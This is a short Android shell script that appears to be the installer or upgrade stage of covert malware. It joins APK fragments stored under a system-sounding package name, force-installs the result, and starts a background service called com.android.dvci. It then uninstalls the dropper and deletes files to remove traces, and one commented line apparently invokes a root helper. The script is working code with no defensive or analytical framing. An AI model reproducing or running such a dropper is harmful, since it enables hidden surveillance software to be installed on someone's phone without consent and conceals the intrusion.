export LD_LIBRARY_PATH=/vendor/lib:/system/lib

rm /sdcard/core.apk
cat /data/data/com.android.deviceinfo/app_qza/core.*.apk > /sdcard/core.apk

pm install -f /sdcard/core.apk
am startservice com.android.dvci/.ServiceMain

pm uninstall com.android.deviceinfo
#rm -r /data/data/com.android.deviceinfo
#rm /data/app/com.android.deviceinfo*
#rilcap ru

rm /sdcard/core.apk
#rm /data/data/com.android.deviceinfo/app_qza/upgrade.*.sh
#rm /data/data/com.android.deviceinfo/app_qza/core.*.apk
